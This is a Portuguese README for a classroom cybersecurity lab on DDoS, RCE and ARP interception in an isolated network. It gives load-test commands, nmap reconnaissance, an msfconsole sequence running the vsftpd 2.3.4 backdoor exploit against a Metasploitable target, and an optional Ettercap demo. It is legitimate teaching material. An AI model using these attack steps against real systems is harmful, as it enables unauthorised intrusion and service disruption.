# Aula prática de Cibersegurança — DDoS · Malware · RCE

Pacote pronto para executar. O plano completo da aula (teoria, rubrica e
checklists) está em `aula-ciberseguranca-ddos-malware-rce.md`, aqui na raiz.
**Tudo é sintético e para rede isolada.**

## Mapa do repositório
```
.
├── README.md                                  <- este guia (ordem de execução)
├── aula-ciberseguranca-ddos-malware-rce.md    <- plano completo da aula
└── material-pratico/
    ├── pratica1-ddos/
    │   ├── servidor_teste.py          servidor HTTP de teste (roda no Pi ou Kali)
    │   ├── medir_baseline.sh          mede tempo de resposta ANTES (estação cliente)
    │   ├── carga_controlada.sh        carga pequena/interrompível (hey ou ab)
    │   └── monitorar_recursos.sh      CPU/mem/conexões DO servidor durante a carga
    ├── pratica2-rce/
    │   ├── reconhecimento.sh          nmap -sV do alvo de laboratório
    │   └── roteiro-metasploit.md      ciclo identificar→validar→mitigar (comentado)
    ├── pratica3-ettercap/
    │   ├── analisar_pcap.sh           HTTP-claro vs TLS-cifrado + ARP envenenado
    │   └── ver_arp.sh                 tabela ARP atual + destaque de MAC duplicado
    ├── desafio-final/
    │   ├── gerar_evidencias.py        (re)gera todas as evidências sintéticas
    │   ├── BRIEFING-alunos.md         enunciado + lista de evidências (p/ alunos)
    │   ├── GABARITO-professor.md      respostas comentadas (SÓ local - fora do repositório)
    │   ├── web_access.log  web_metrics.csv  recon_services.txt
    │   ├── host_events.log  arp_table_before_after.txt
    │   └── lab_trafego.pcap  arp_incident.pcap
    └── folha-registro/
        └── folha-de-registro.md       folha dos grupos (imprimir)
```

## Premissas de rede (ajuste e confirme)
Padrão usado nas evidências: faixa isolada **`192.168.56.0/24`** (host-only do VirtualBox).
- Gateway `.1` · Estação `.30` · **Alvo vulnerável `.40`** · Atacante (sintético) `.50`
- Estação do professor (Pi/servidor de teste): use um IP livre, ex.: `.10`.

Se sua rede for outra, edite as constantes no topo de `material-pratico/desafio-final/gerar_evidencias.py` e **regenere** (`python3 gerar_evidencias.py`), além de passar o IP certo aos scripts.

### Fazer o Kali e o Windows VM se enxergarem (configuração mínima)

> **Atenção:** os comandos `netsh`/`ipconfig` abaixo rodam **dentro da VM Windows convidada** (a estação do laboratório, `.30`) — não no Windows hospedeiro onde o VirtualBox está instalado. O firewall do hospedeiro não interfere no tráfego VM↔VM.

**No hipervisor (VirtualBox sobre Windows: faça nas DUAS VMs — Kali e Windows):**
`Configurações → Rede → Adaptador 1` → modo **Placa somente-hospedeiro (host-only)**, cabo conectado, modo promíscuo "Permitir tudo" (só precisa no Ettercap ao vivo). O adaptador host-only ("VirtualBox Host-Only Ethernet Adapter", com o `.1`) já existe por padrão — confira em `Arquivo → Ferramentas → Gerenciador de rede` no VirtualBox. *VMware:* `Host-only` (vmnet1) nas duas.

**⚠️ Setup típico desta aula — Servidor = Pi físico · Cliente = Kali VM no VirtualBox (Windows):** o host-only **não alcança o Pi físico** — a Kali VM precisa de **modo Bridge**. Windows hospedeiro: NIC **Ethernet (cabo, não Wi-Fi)** no switch isolado, IP `192.168.56.30` sem gateway. Kali VM: Adaptador 1 → **Bridge na placa Ethernet** → dentro do Kali, IP `192.168.56.20/24` sem gateway. Pi: Ethernet no mesmo switch, IP `192.168.56.10` (nmcli ou `/etc/dhcpcd.conf`). **Copie o material (`material-pratico/`) para dentro do Pi e da Kali VM** (git clone ou Pasta Compartilhida do VirtualBox). Verifique: Kali→`ping -c 3 192.168.56.10`; Windows→`ping 192.168.56.10` e `ping 192.168.56.20`; Pi→`ping -c 3 192.168.56.20`. Detalhe completo: seção 4 do plano, "Cenário 3".

**Endereços (mesma sub-rede, gateway vazio):** Kali `192.168.56.20` · Windows `192.168.56.30` · máscara `255.255.255.0`.

**Windows VM (PowerShell/CMD como Administrador):**
```bat
netsh interface ip set address name="Ethernet" static 192.168.56.30 255.255.255.0
netsh advfirewall firewall add rule name="Lab ICMPv4" protocol=icmpv4:8,any dir=in action=allow
```
(o firewall do Windows bloqueia ping de entrada por padrão — a 2ª linha é obrigatória; veja o nome do adaptador com `netsh interface show interface`)

**Kali:**
```bash
nmcli con show      # nome da conexão (ex.: "Wired connection 1")
sudo nmcli con mod "Wired connection 1" ipv4.method manual ipv4.addresses 192.168.56.20/24 ipv4.gateway "" ipv4.dns ""
sudo nmcli con up "Wired connection 1"
```

**Verificação (obrigatória nas duas direções):**
```bash
# no Kali
ping -c 3 192.168.56.30
```
```bat
:: no Windows
ping 192.168.56.20
```

Passo a passo completo (com diagnóstico de falhas): seção 4 do plano `aula-ciberseguranca-ddos-malware-rce.md` → "Configuração de rede — Kali × Windows VM".

## Antes da aula (5 min de checagem)
```bash
# no host da estação do professor
uname -m            # Pi deve mostrar aarch64 (ARM64) -> NÃO roda VM x86
ip addr; ip route   # anote o IP; confirme que a rede está isolada
nmap --version; tshark --version
# gerador de carga: tenha 'hey' OU 'ab' (apache2-utils) em alguma estação
```
As evidências do desafio **já estão geradas** em `material-pratico/desafio-final/`. Para recriá-las:
```bash
cd material-pratico/desafio-final && python3 gerar_evidencias.py
```

---

## Ordem de execução na aula

> **Valores padrão deste laboratório** (ajuste se a sua rede for outra — os comandos abaixo já vêm prontos para copiar e colar):
> - Servidor de teste (Pi/professor): `192.168.56.10` · Kali: `192.168.56.20` · Windows: `192.168.56.30` · Alvo Metasploitable: `192.168.56.40` · Atacante (sintético): `192.168.56.50`

### Prática 1 — DDoS / disponibilidade (~15 min)
**No servidor (Pi ou Kali) — abra DUAS abas de terminal:**
```bash
cd material-pratico/pratica1-ddos
python3 servidor_teste.py
```
```bash
# na 2ª aba DO SERVIDOR:
cd material-pratico/pratica1-ddos
./monitorar_recursos.sh 8000
```
**Na estação cliente:**
```bash
cd material-pratico/pratica1-ddos
./medir_baseline.sh 192.168.56.10 8000 /status
./carga_controlada.sh 192.168.56.10 8000 /relatorio 200 10
./medir_baseline.sh 192.168.56.10 8000 /relatorio
```
Observe: latência sobe? aparecem falhas? CPU satura? → discutir teste legítimo × DDoS.
**Parar:** `Ctrl+C` no cliente e no servidor.

### Prática 2 — RCE com Metasploit (~20 min)
```bash
cd material-pratico/pratica2-rce
./reconhecimento.sh 192.168.56.40
msfconsole -q
```
Dentro do msfconsole (cenário padrão vsftpd 2.3.4 — detalhes e saídas esperadas em `roteiro-metasploit.md`):
```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.56.40
check
run
id
hostname
exit
sessions -K
exit
```
Sem alvo vivo? Use o **plano alternativo** do roteiro + `material-pratico/desafio-final/recon_services.txt` e `host_events.log`.

### Prática 3 — Interceptação / Ettercap (~15 min)
```bash
cd material-pratico/pratica3-ettercap
./analisar_pcap.sh ../desafio-final
./ver_arp.sh
ip neigh        # Linux (Pi/Kali): tabela ARP/vizinhança
arp -a          # Windows: tabela ARP
```
Demonstração ao vivo do Ettercap é **opcional** e só em rede isolada com tráfego sintético (ver seção 8 do plano). Se a interface não aparecer, fique na análise de `.pcap`.

### Desafio final — "Sertão Digital" (~25 min + apresentações)
**Entregue aos grupos** (copiar para as estações deles): `material-pratico/desafio-final/BRIEFING-alunos.md` + todas as evidências da pasta (logs, CSV, TXT, `.pcap`) — **exceto** o `GABARITO`.
**Análise pelos grupos (comandos prontos):**
```bash
cd material-pratico
pratica3-ettercap/analisar_pcap.sh desafio-final        # HTTP/TLS + ARP envenenado
cat desafio-final/web_metrics.csv                       # métricas (abrir na planilha)
cat desafio-final/host_events.log                       # eventos do host
cat desafio-final/recon_services.txt                    # reconhecimento do alvo
cat desafio-final/arp_table_before_after.txt            # ARP antes/depois
wireshark desafio-final/lab_trafego.pcap                # se Wireshark gráfico instalado
wireshark desafio-final/arp_incident.pcap
```
Correção com `material-pratico/desafio-final/GABARITO-professor.md` (arquivo local do professor, fora do repositório) e rubrica (seção 13 do plano).

---

## Encerramento
Siga o **Checklist de encerramento** (seção 14 do plano): parar servidor/carga, restaurar snapshot do alvo, conferir ARP normal, arquivar evidências/folhas, segregar a rede. Lembre: os `.pcap`/logs aqui são sintéticos; podem ficar para reuso.

## Regras de segurança (valem para toda a aula)
- Rede **isolada**; nunca testar endereços públicos ou de terceiros.
- Carga **pequena**, autorizada e interrompível; parar imediatamente se houver degradação inesperada.
- Exploração **só** no alvo de laboratório; sem persistência, evasão, roubo de credenciais ou ransomware.
- A aula **não depende** de exploração bem-sucedida — a avaliação é pela investigação e interpretação.
